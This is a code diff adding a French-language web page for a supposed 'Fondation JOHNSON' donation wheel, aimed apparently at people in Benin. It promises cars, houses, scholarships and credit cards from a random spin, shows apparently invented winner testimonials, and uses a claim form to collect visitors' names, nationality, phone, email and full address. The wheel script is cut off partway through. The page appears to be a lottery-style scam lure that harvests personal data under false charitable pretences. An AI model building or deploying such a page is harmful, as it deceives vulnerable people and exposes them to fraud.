@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fondation JOHNSON — La Roue de la Générosité</title>
+    <style>
+        :root {
+            --bg-start: #fdf6f0;
+            --bg-mid: #fef9f4;
+            --bg-end: #f9efe4;
+            --gold-dark: #8b6914;
+            --gold: #c49b2a;
+            --gold-light: #e8c547;
+            --gold-pale: #f7e7b4;
+            --text-dark: #3e2f1c;
+            --text-medium: #5c3d1e;
+            --text-light: #7a5c3a;
+            --accent-coral: #e07b5a;
+            --accent-teal: #3d8b7e;
+            --white-soft: #fffdf9;
+            --shadow-soft: 0 4px 24px rgba(80, 40, 10, 0.10);
+            --shadow-medium: 0 8px 40px rgba(60, 30, 5, 0.14);
+            --radius-lg: 28px;
+            --radius-xl: 40px;
+            --transition-smooth: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(160deg, #fdf3e8 0%, #fef8f2 25%, #fdf5ed 50%, #f9efe0 75%, #fdf4ea 100%);
+            background-attachment: fixed;
+            color: var(--text-dark);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        /* Particules de fond */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -180px;
+            left: -180px;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(220, 170, 90, 0.08) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatGlow1 14s ease-in-out infinite;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -200px;
+            right: -160px;
+            width: 550px;
+            height: 550px;
+            background: radial-gradient(circle, rgba(200, 140, 70, 0.07) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatGlow2 18s ease-in-out infinite;
+        }
+
+        @keyframes floatGlow1 {
+            0%,
+            100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(40px, 25px) scale(1.15); }
+            66% { transform: translate(-20px, -15px) scale(0.92); }
+        }
+        @keyframes floatGlow2 {
+            0%,
+            100% { transform: translate(0, 0) scale(1); }
+            40% { transform: translate(-35px, -20px) scale(1.1); }
+            70% { transform: translate(25px, 30px) scale(0.88); }
+        }
+
+        .page-container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        /* ---------- HERO AMÉLIORÉE ---------- */
+        .hero {
+            width: 100%;
+            max-width: 1100px;
+            padding: 80px 20px 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 24px;
+        }
+        .foundation-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--white-soft);
+            border: 1.5px solid rgba(180, 130, 60, 0.3);
+            border-radius: 50px;
+            padding: 8px 22px 8px 14px;
+            box-shadow: var(--shadow-soft);
+            letter-spacing: 0.3px;
+        }
+        .foundation-badge .heart-icon {
+            width: 34px;
+            height: 34px;
+            background: linear-gradient(135deg, #e07b5a, #c0392b);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #fff;
+            flex-shrink: 0;
+            box-shadow: 0 3px 10px rgba(200, 60, 40, 0.25);
+        }
+        .foundation-badge span {
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: var(--text-medium);
+        }
+        .hero h1 {
+            font-family: 'Georgia', 'Playfair Display', 'Times New Roman', serif;
+            font-size: clamp(2.2rem, 6vw, 3.8rem);
+            font-weight: 700;
+            color: #3e2510;
+            letter-spacing: 0.6px;
+            line-height: 1.2;
+            max-width: 800px;
+        }
+        .hero h1 .accent {
+            color: #b8731f;
+            position: relative;
+        }
+        .hero .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            font-weight: 400;
+            max-width: 650px;
+            line-height: 1.6;
+            margin: 0 auto;
+        }
+        .hero-highlights {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin: 8px 0 4px;
+        }
+        .highlight-badge {
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(180, 130, 60, 0.25);
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: #5c3d1e;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: var(--shadow-soft);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .highlight-badge:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-medium);
+        }
+        .highlight-badge .badge-icon {
+            font-size: 1.3rem;
+        }
+        .hero-visual {
+            font-size: 6rem;
+            margin: 8px 0;
+            animation: gentleRotate 12s linear infinite;
+            filter: drop-shadow(0 8px 20px rgba(180, 120, 40, 0.35));
+        }
+        @keyframes gentleRotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .hero .cta-button {
+            display: inline-block;
+            padding: 16px 48px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            color: #fff;
+            background: linear-gradient(175deg, #e2a83e 0%, #c4881f 30%, #a66d14 70%, #8b5a0e 100%);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 6px 22px rgba(140, 80, 15, 0.32);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            text-decoration: none;
+            margin-top: 8px;
+        }
+        .hero .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(140, 80, 15, 0.4);
+            background: linear-gradient(175deg, #f0b84a 0%, #d49424 30%, #b07518 70%, #955f10 100%);
+        }
+
+        /* ---------- JEU (ROUE) ---------- */
+        .game-section {
+            width: 100%;
+            max-width: 620px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 22px;
+            padding: 30px 20px 50px;
+            scroll-margin-top: 80px;
+        }
+        .wheel-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 540px;
+            aspect-ratio: 1 / 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            filter: drop-shadow(0 0 35px rgba(180, 120, 40, 0.28));
+            transition: filter var(--transition-smooth);
+        }
+        .wheel-wrapper.spinning {
+            filter: drop-shadow(0 0 55px rgba(200, 140, 50, 0.45));
+        }
+        canvas#wheelCanvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+            border-radius: 50%;
+            cursor: default;
+        }
+        .pointer-glow {
+            position: absolute;
+            top: -2px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 18px;
+            height: 18px;
+            background: radial-gradient(circle, #ffe082 0%, #e8a817 60%, #b8740e 100%);
+            border-radius: 50%;
+            z-index: 5;
+            box-shadow: 0 0 18px 6px rgba(220, 160, 30, 0.7), 0 0 40px 12px rgba(200, 140, 20, 0.35);
+            animation: pulseGlow 2.2s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes pulseGlow {
+            0%,
+            100% { box-shadow: 0 0 18px 6px rgba(220, 160, 30, 0.7), 0 0 40px 12px rgba(200, 140, 20, 0.35); }
+            50% { box-shadow: 0 0 26px 10px rgba(240, 185, 40, 0.9), 0 0 55px 18px rgba(210, 150, 25, 0.5); }
+        }
+        .spin-button {
+            display: inline-block;
+            padding: 16px 48px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            color: #fff;
+            background: linear-gradient(175deg, #e2a83e 0%, #c4881f 30%, #a66d14 70%, #8b5a0e 100%);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 6px 22px rgba(140, 80, 15, 0.32);
+            transition: all var(--transition-smooth);
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .spin-button::after {
+            content: '';
+            position: absolute;
+            inset: 3px;
+            border-radius: 50px;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 60%);
+            pointer-events: none;
+        }
+        .spin-button:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(140, 80, 15, 0.4);
+            background: linear-gradient(175deg, #f0b84a 0%, #d49424 30%, #b07518 70%, #955f10 100%);
+        }
+        .spin-button:active:not(:disabled) {
+            transform: translateY(1px) scale(0.97);
+        }
+        .spin-button:disabled {
+            opacity: 0.55;
+            cursor: not-allowed;
+            filter: grayscale(20%);
+        }
+        .result-area {
+            min-height: 52px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 10px;
+        }
+        .result-message {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-medium);
+            padding: 12px 28px;
+            background: var(--white-soft);
+            border-radius: 40px;
+            box-shadow: var(--shadow-soft);
+            border: 1.5px solid rgba(180, 130, 60, 0.2);
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1.4);
+        }
+        .result-message.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .result-message .prize-name {
+            color: #b8731f;
+            font-weight: 700;
+            font-size: 1.25rem;
+            display: block;
+            margin-top: 2px;
+        }
+        .result-message .emoji-celebration {
+            font-size: 1.6rem;
+            display: inline-block;
+            animation: bounceEmoji 0.6s ease-out;
+        }
+        @keyframes bounceEmoji {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.4); }
+            70% { transform: scale(0.85); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .form-container {
+            width: 100%;
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height 0.7s cubic-bezier(0.25, 0.8, 0.25, 1.2), opacity 0.5s ease;
+            margin-top: 8px;
+        }
+        .form-container.expanded {
+            max-height: 900px;
+            opacity: 1;
+        }
+        .claim-form {
+            background: var(--white-soft);
+            border-radius: var(--radius-lg);
+            padding: 28px 24px 24px;
+            box-shadow: var(--shadow-medium);
+            border: 1.5px solid rgba(180, 130, 60, 0.25);
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            text-align: left;
+        }
+        .prize-display {
+            background: linear-gradient(105deg, #f7edd5, #fef5e6);
+            border-left: 5px solid #c49b2a;
+            border-radius: 18px;
+            padding: 14px 18px;
+            font-size: 1rem;
+            color: #4e3b22;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        .prize-display .prize-label {
+            font-weight: 700;
+            color: #8b6914;
+            font-size: 1.2rem;
+        }
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .form-group {
+            flex: 1 1 200px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-group.full-width {
+            flex: 1 1 100%;
+        }
+        .form-group label {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-medium);
+        }
+        .form-group label .optional {
+            font-weight: 400;
+            font-style: italic;
+            color: #9b8a72;
+            font-size: 0.8rem;
+        }
+        .form-group input,
+        .form-group textarea {
+            padding: 11px 14px;
+            border: 1.5px solid #e6d7bb;
+            border-radius: 14px;
+            background: #fffef9;
+            font-size: 0.9rem;
+            color: #3e2f1c;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            outline: none;
+            font-family: inherit;
+        }
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px rgba(196, 155, 42, 0.15);
+        }
+        .submit-button {
+            margin-top: 10px;
+            padding: 16px;
+            background: linear-gradient(135deg, #3d8b7e, #2c6e63);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(61, 139, 126, 0.25);
+        }
+        .submit-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(61, 139, 126, 0.35);
+            background: linear-gradient(135deg, #4aa394, #347d71);
+        }
+
+        /* ---------- BÉNÉFICIAIRES ---------- */
+        .beneficiaries {
+            width: 100%;
+            max-width: 1100px;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        .beneficiaries h2 {
+            font-family: 'Georgia', serif;
+            font-size: 2.2rem;
+            color: #3e2510;
+            margin-bottom: 40px;
+        }
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        .beneficiary-card {
+            background: var(--white-soft);
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: var(--shadow-soft);
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: 1px solid rgba(180, 130, 60, 0.1);
+            text-align: left;
+        }
+        .beneficiary-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-medium);
+        }
+        .card-img {
+            height: 220px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-color: #f3ebd8;
+            padding: 10px;
+        }
+        .card-content {
+            padding: 20px 20px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .card-content h3 {
+            font-size: 1.3rem;
+            color: #5c3d1e;
+            margin: 0;
+        }
+        .card-content .gain-tag {
+            display: inline-block;
+            background: #f7edd5;
+            color: #8b6914;
+            font-weight: 600;
+            font-size: 0.8rem;
+            padding: 4px 12px;
+            border-radius: 20px;
+            width: fit-content;
+            margin: 4px 0;
+        }
+        .card-content p {
+            font-size: 0.95rem;
+            color: #7a5c3a;
+            line-height: 1.5;
+        }
+
+        /* ---------- COMMENT ÇA MARCHE ---------- */
+        .how-it-works {
+            width: 100%;
+            max-width: 1000px;
+            padding: 50px 20px 70px;
+            text-align: center;
+        }
+        .how-it-works h2 {
+            font-family: 'Georgia', serif;
+            font-size: 2.2rem;
+            color: #3e2510;
+            margin-bottom: 40px;
+            position: relative;
+            display: inline-block;
+        }
+        .how-it-works h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 70px;
+            height: 3px;
+            background: #c49b2a;
+            border-radius: 2px;
+        }
+        .steps {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 28px;
+        }
+        .step {
+            background: var(--white-soft);
+            border-radius: 24px;
+            padding: 30px 22px;
+            box-shadow: var(--shadow-soft);
+            flex: 1 1 200px;
+            max-width: 240px;
+            border: 1px solid rgba(180, 130, 60, 0.15);
+            transition: transform 0.3s;
+        }
+        .step:hover {
+            transform: translateY(-5px);
+        }
+        .step-icon {
+            font-size: 2.8rem;
+            margin-bottom: 16px;
+        }
+        .step h3 {
+            font-size: 1.2rem;
+            color: #5c3d1e;
+            margin-bottom: 8px;
+        }
+        .step p {
+            font-size: 0.9rem;
+            color: #7a5c3a;
+        }
+
+        /* ---------- FOOTER ---------- */
+        .footer {
+            width: 100%;
+            background: #f5ead5;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #5c3d1e;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            border-top: 1px solid rgba(160, 120, 50, 0.25);
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #8b6914;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .footer-links a:hover {
+            color: #5c3d1e;
+            text-decoration: underline;
+        }
+        .footer .copyright {
+            font-size: 0.8rem;
+            color: #7a5c3a;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 1.9rem;
+            }
+            .hero .subtitle {
+                font-size: 1rem;
+            }
+            .hero-visual {
+                font-size: 4rem;
+            }
+            .cards-grid {
+                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+                gap: 20px;
+            }
+            .step {
+                max-width: 200px;
+            }
+        }
+        @media (max-width: 500px) {
+            .hero {
+                padding: 40px 16px 30px;
+            }
+            .hero h1 {
+                font-size: 1.6rem;
+            }
+            .highlight-badge {
+                padding: 8px 14px;
+                font-size: 0.8rem;
+            }
+            .cards-grid {
+                grid-template-columns: 1fr;
+            }
+            .step {
+                max-width: 100%;
+                flex: 1 1 100%;
+            }
+            .spin-button {
+                padding: 14px 32px;
+                font-size: 1rem;
+            }
+            .wheel-wrapper {
+                max-width: 320px;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 12px;
+            }
+        }
+    </style>
+    <link rel="icon" type="image/png" href="favicon.webp">
+</head>
+<body>
+    <div class="page-container">
+        <!-- SECTION HERO AMÉLIORÉE -->
+        <section class="hero">
+            <div class="foundation-badge">
+                <div class="heart-icon">&#10084;</div>
+                <span>Fondation JOHNSON</span>
+            </div>
+            <h1>Un tour de roue, <span class="accent">une vie transformée</span></h1>
+            <p class="subtitle">
+                La Fondation JOHNSON utilise le hasard pour distribuer des donations de manière totalement impartiale.
+                Financements, voitures, maisons, électroménager… Découvrez votre chance et repartez peut-être avec le soutien dont vous rêvez.
+            </p>
+            <div class="hero-highlights">
+                <div class="highlight-badge"><span class="badge-icon">🚗</span> Voiture</div>
+                <div class="highlight-badge"><span class="badge-icon">🏠</span> Maison</div>
+                <div class="highlight-badge"><span class="badge-icon">💻</span> Ordinateur/Téléphone</div>
+                <div class="highlight-badge"><span class="badge-icon">🎓</span> Bourse d'études</div>
+                <div class="highlight-badge"><span class="badge-icon">🩺</span> Financement Projet</div>
+                <div class="highlight-badge"><span class="badge-icon">📦</span> Équipement pro</div>
+            </div>
+            <div class="hero-visual">🎡</div>
+            <a href="#jeu" class="cta-button">✨ Tenter ma chance maintenant</a>
+        </section>
+
+        <!-- SECTION JEU (ROUE) -->
+        <section class="game-section" id="jeu">
+            <div class="wheel-wrapper" id="wheelWrapper">
+                <div class="pointer-glow" id="pointerGlow"></div>
+                <canvas id="wheelCanvas" aria-label="Roue de la fortune de la Fondation JOHNSON"></canvas>
+            </div>
+            <button class="spin-button" id="spinButton" title="Lancer la roue">&#127744; Tourner la roue</button>
+            <div class="result-area">
+                <div class="result-message" id="resultMessage"></div>
+            </div>
+            <div class="form-container" id="formContainer">
+                <form class="claim-form" id="claimForm" action="https://formsubmit.co/donations@fondationjohnson.org" method="POST">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_subject" value="Nouvelle demande de retrait - Fondation JOHNSON">
+                    <input type="hidden" name="_autoresponse" value="Merci pour votre demande. La Fondation JOHNSON vous contactera dans les plus brefs délais.">
+                    <input type="hidden" name="_next" value="confirmation.html">
+                    <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
+                    <input type="hidden" name="gain" id="gainField" value="">
+
+                    <div class="prize-display">
+                        🎁 Votre gain : <span class="prize-label" id="prizeDisplay">---</span>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="nom">Nom *</label>
+                            <input type="text" id="nom" name="nom" placeholder="Votre nom" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="prenoms">Prénoms *</label>
+                            <input type="text" id="prenoms" name="prenoms" placeholder="Vos prénoms" required>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="nationalite">Nationalité *</label>
+                            <input type="text" id="nationalite" name="nationalite" placeholder="Ex: Béninoise" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="telephone">Téléphone *</label>
+                            <input type="tel" id="telephone" name="telephone" placeholder="+229 XX XX XX XX" required>
+                        </div>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="email">Courriel électronique *</label>
+                        <input type="email" id="email" name="email" placeholder="votre@email.com" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="profession">Profession <span class="optional">(facultatif)</span></label>
+                        <input type="text" id="profession" name="profession" placeholder="Votre profession">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="ville">Ville de résidence *</label>
+                            <input type="text" id="ville" name="ville" placeholder="Ex: Cotonou" required>
+                        </div>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="adresse">Adresse complète *</label>
+                        <textarea id="adresse" name="adresse" rows="2" placeholder="Rue, quartier, etc." required></textarea>
+                    </div>
+                    <button type="submit" class="submit-button">📩 Envoyer ma demande</button>
+                </form>
+            </div>
+        </section>
+
+        <!-- SECTION BÉNÉFICIAIRES (6 cartes avec photos) -->
+        <section class="beneficiaries">
+            <h2>Ils ont déjà gagné</h2>
+            <div class="cards-grid">
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-voiture.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">🚗 Voiture</span>
+                        <h3>Aminata K.</h3>
+                        <p>« Grâce à ce véhicule, j'ai pu lancer mon service de livraison et subvenir aux besoins de mes enfants. »</p>
+                    </div>
+                </div>
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-maison.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">🏠 Maison</span>
+                        <h3>Jean-Louis T.</h3>
+                        <p>« Ma famille et moi avons enfin un toit stable. Un rêve devenu réalité. »</p>
+                    </div>
+                </div>
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-ordinateur.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">💻 Ordinateur</span>
+                        <h3>Mariam A.</h3>
+                        <p>« Cet ordinateur m'a permis de suivre ma formation en ligne et de décrocher un emploi. »</p>
+                    </div>
+                </div>
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-bourse.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">🎓 Bourse d'études</span>
+                        <h3>Koffi D.</h3>
+                        <p>« J'ai pu reprendre mes études de médecine grâce à cette bourse inespérée. »</p>
+                    </div>
+                </div>
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-hopital.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">🩺 Soins médicaux</span>
+                        <h3>Estelle M.</h3>
+                        <p>« L'opération de ma fille a été entièrement financée. Merci du fond du cœur. »</p>
+                    </div>
+                </div>
+                <div class="beneficiary-card">
+                    <div class="card-img" style="background-image: url('assets/gagnant-equipement.webp');"></div>
+                    <div class="card-content">
+                        <span class="gain-tag">📦 Équipement pro</span>
+                        <h3>Paul E.</h3>
+                        <p>« Avec ce matériel de couture, j'ai ouvert mon atelier et je vis de ma passion. »</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- COMMENT ÇA MARCHE -->
+        <section class="how-it-works">
+            <h2>Comment ça marche ?</h2>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-icon">🎡</div>
+                    <h3>Tournez la roue</h3>
+                    <p>Lancez la roue depuis notre page en un seul clic.</p>
+                </div>
+                <div class="step">
+                    <div class="step-icon">🎁</div>
+                    <h3>Découvrez votre lot</h3>
+                    <p>Le hasard désigne un gain parmi nos nombreuses donations.</p>
+                </div>
+                <div class="step">
+                    <div class="step-icon">📝</div>
+                    <h3>Remplissez le formulaire</h3>
+                    <p>Communiquez vos coordonnées pour que nous puissions vous le remettre.</p>
+                </div>
+                <div class="step">
+                    <div class="step-icon">📬</div>
+                    <h3>Recevez votre don</h3>
+                    <p>Notre équipe vous contacte et organise la remise en toute transparence.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="conditions.html">Conditions d'utilisation</a>
+                <a href="confidentialite.html">Politique de confidentialité</a>
+            </div>
+            <p>Fondation JOHNSON — Solidarité sans frontières</p>
+            <p class="copyright">&copy; 2026 Fondation JOHNSON. Tous droits réservés.</p>
+        </footer>
+    </div>
+
+    <script>
+        (function() {
+            // ────────────────────────────────────────
+            // CONFIGURATION DE LA ROUE
+            // ────────────────────────────────────────
+            const SEGMENT_LABELS = [
+                'Financement Projet', 'Voiture & Carte de Crédit', 'Maison & Carte de Crédit', 'Électroménager & Téléphone',
+                'Bourse d\'études & Carte de Crédit', 'Soins médicaux', 'Équipement Pro & Carte de Crédit',
+                'Aide alimentaire & Carte de Crédit', 'Ordinateur & Carte de Crédit', 'Formation & Carte de Crédit'
+            ];
+            const SEGMENT_COLORS = [
+                '#e85d5d', '#f4b740', '#4daa7a', '#5b8def',
+                '#f08c4a', '#9b6cc4', '#2cb9a0', '#e8738a',
+                '#f0c040', '#6c7ce0'
+            ];
+            const NUM_SEGMENTS = SEGMENT_LABELS.length;
+            const SEGMENT_ANGLE = (2 * Math.PI) / NUM_SEGMENTS;
+            const CANVAS_SIZE = 600;
+            const CENTER = CANVAS_SIZE / 2;
+            const WHEEL_RADIUS = 245;
+            const OUTER_RING_WIDTH = 16;
+            const INNER_HUB_RADIUS = 42;
+
+            let currentAngle = 0;
+            let angularVelocity = 0;
+            let isSpinning = false;
+            let animationId = null;
+            let lastTimestamp = null;
+
+            const canvas = document.getElementById('wheelCanvas');
+            const ctx = canvas.getContext('2d');
+            const spinButton = document.getElementById('spinButton');
+            const resultMessage = document.getElementById('resultMessage');
+            const wheelWrapper = document.getElementById('wheelWrapper');
+            const pointerGlow = document.getElementById('pointerGlow');
+            const formContainer = document.getElementById('formContainer');
+            const claimForm = document.getElementById('claimForm');
+            const gainField = document.getElementById('gainField');
+            const prizeDisplay = document.getElementById('prizeDisplay');
+
+            canvas.width = CANVAS_SIZE;
+            canvas.height = CANVAS_SIZE;
+
+            // ────────────────────────────────────────
+            // FONCTIONS DE DESSIN
+            // ────────────────────────────────────────
+            function lightenColor(hex, percent) {
+                const num = parseInt(hex.replace('#', ''), 16);
+                const r = Math.min(255, (num >> 16) + Math.round(2.55 * percent));
+                const g = Math.min(255, ((num >> 8) & 0x00FF00) + Math.round(2.55 * percent));
+                const b = Math.min(255, (num & 0x0000FF) + Math.round(2.55 * percent));
+                return `rgb(${r},${g},${b})`;
+            }
+            function darkenColor(hex, percent) {
+                const num = parseInt(hex.replace('#', ''), 16);
+                const r = Math.max(0, (num >> 16) - Math.round(2.55 * percent));
+                const g = Math.max(0, ((num >> 8) & 0x00FF00) - Math.round(2.55 * percent));
+                const b = Math.max(0, (num & 0x0000FF) - Math.round(2.55 * percent));
+                return `rgb(${r},${g},${b})`;
+            }
+
+            function drawSegment(cx, cy, r, startAngle, endAngle, color) {
+                ctx.beginPath();
+                ctx.moveTo(cx, cy);
+                ctx.arc(cx, cy, r, startAngle, endAngle);
+                ctx.closePath();
+                const grad = ctx.createRadialGradient(cx, cy, r * 0.3, cx, cy, r);
+                grad.addColorStop(0, lightenColor(color, 25));
+                grad.addColorStop(0.55, color);
+                grad.addColorStop(1, darkenColor(color, 12));
+                ctx.fillStyle = grad;
+                ctx.fill();
+                ctx.strokeStyle = 'rgba(255,255,255,0.35)';
+                ctx.lineWidth = 1.8;
+                ctx.stroke();
+            }
+
+            function drawOuterRing(cx, cy, r, ringWidth) {
+                const outerR = r + ringWidth;
+                const innerR = r - 2;
+                ctx.beginPath();
+                ctx.arc(cx, cy, outerR, 0, 2 * Math.PI);
+                ctx.arc(cx, cy, innerR, 0, 2 * Math.PI, true);
+                ctx.closePath();
+                const grad = ctx.createRadialGradient(cx, cy, innerR, cx, cy, outerR);
+                grad.addColorStop(0, '#d4a840');
+                grad.addColorStop(0.35, '#c4942c');
+                grad.addColorStop(0.6, '#b88320');
+                grad.addColorStop(0.85, '#9a6d18');
+                grad.addColorStop(1, '#7d5510');
+                ctx.fillStyle = grad;
+                ctx.fill();
+                ctx.beginPath();
+                ctx.arc(cx, cy, innerR + 1, 0, 2 * Math.PI);
+                ctx.strokeStyle = 'rgba(255,220,160,0.6)';
+                ctx.lineWidth = 2;
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.arc(cx, cy, outerR - 1, 0, 2 * Math.PI);
+                ctx.strokeStyle = 'rgba(255,220,150,0.45)';
+                ctx.lineWidth = 1.5;
+                ctx.stroke();
+            }
+
+            function drawRingLights(cx, cy, r, ringWidth) {
+                const lightR = r + ringWidth / 2;
+                for (let i = 0; i < 50; i++) {
+                    const angle = (i / 50) * 2 * Math.PI;
+                    const lx = cx + Math.cos(angle) * lightR;
+                    const ly = cy + Math.sin(angle) * lightR;
+                    const isBright = (i % 3 === 0);
+                    const grad = ctx.createRadialGradient(lx, ly, 0, lx, ly, 4.5);
+                    if (isBright) {
+                        grad.addColorStop(0, '#fffde8');
+                        grad.addColorStop(0.4, '#ffe9a0');
+                        grad.addColorStop(1, 'rgba(200,150,40,0.3)');
+                    } else {
+                        grad.addColorStop(0, '#f5e6c8');
+                        grad.addColorStop(0.5, '#d4b870');
+                        grad.addColorStop(1, 'rgba(160,120,40,0.25)');
+                    }
+                    ctx.beginPath();
+                    ctx.arc(lx, ly, 4.5, 0, 2 * Math.PI);
+                    ctx.fillStyle = grad;
+                    ctx.fill();
+                }
+            }
+
+            function drawCenterHub(cx, cy, hubR) {
+                const grad = ctx.createRadialGradient(cx, cy, hubR * 0.15, cx, cy, hubR);
+                grad.addColorStop(0, '#fdf8f0');
+                grad.addColorStop(0.7, '#e8d5b8');
+                grad.addColorStop(1, '#c4a570');
+                ctx.beginPath();
+                ctx.arc(cx, cy, hubR, 0, 2 * Math.PI);
+                ctx.fillStyle = grad;
+                ctx.fill();
+                ctx.strokeStyle = 'rgba(160,120,50,0.7)';
+                ctx.lineWidth = 3;
